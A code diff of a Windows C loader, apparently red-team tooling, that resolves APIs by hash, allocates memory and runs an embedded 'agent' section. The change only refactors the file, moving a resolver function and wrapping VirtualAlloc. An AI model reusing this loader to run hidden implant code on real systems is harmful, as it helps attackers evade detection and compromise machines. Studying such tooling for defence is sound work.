@@ -1,32 +1,18 @@
 #include <windows.h>
+#include "loader.h"
 #include "tcg.h"
  
 DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc   ( LPVOID, SIZE_T, DWORD, DWORD );
 DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualProtect ( LPVOID, SIZE_T, DWORD, PDWORD );
  
-FARPROC resolve ( DWORD mod_hash, DWORD func_hash )
-{
-    HANDLE module = findModuleByHash ( mod_hash );
-    return findFunctionByHash ( module, func_hash );
-}
- 
 #ifdef WIN_X86
 __declspec ( noinline ) ULONG_PTR caller ( VOID ) { return ( ULONG_PTR ) WIN_GET_CALLER ( ); }
 #endif
  
-char __AGENT__  [ 0 ] __attribute__ ( ( section ( "agent" ) ) );
+char __AGENT__  [ 0 ] __attribute__ ( ( section ( "agent"  ) ) );
 char __CONFIG__ [ 0 ] __attribute__ ( ( section ( "config" ) ) );
 
 int __tag_setup_config ( );
-
-typedef struct {
-    int len;
-    char val [ ];
-} RESOURCE;
-
-typedef void ( * AGENT_SETUP ) ( char * data, int len );
-
-#define GET_RESOURCE(x) ( char * ) &x;
  
 void go ( )
 {
@@ -41,8 +27,8 @@ void go ( )
     agent_src = GET_RESOURCE ( __AGENT__ );
  
     /* allocate memory for code and data sections */
-    agent_code = KERNEL32$VirtualAlloc ( NULL, PicoCodeSize ( agent_src ), MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN, PAGE_READWRITE );
-    agent_data = KERNEL32$VirtualAlloc ( NULL, PicoDataSize ( agent_src ), MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN, PAGE_READWRITE );
+    agent_code = allocate_memory ( PicoCodeSize ( agent_src ), PAGE_READWRITE );
+    agent_data = allocate_memory ( PicoDataSize ( agent_src ), PAGE_READWRITE );
 
     /* populate functions */
     funcs.GetProcAddress = GetProcAddress;
@@ -62,4 +48,15 @@ void go ( )
 
     /* call main entry point */
     PicoEntryPoint ( agent_src, agent_code ) ( ( char * ) &go );
+}
+
+LPVOID allocate_memory ( size_t size, DWORD protection )
+{
+    return KERNEL32$VirtualAlloc ( NULL, size, MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN, protection );
+}
+
+FARPROC resolve ( DWORD mod_hash, DWORD func_hash )
+{
+    HANDLE module = findModuleByHash ( mod_hash );
+    return findFunctionByHash ( module, func_hash );
 }
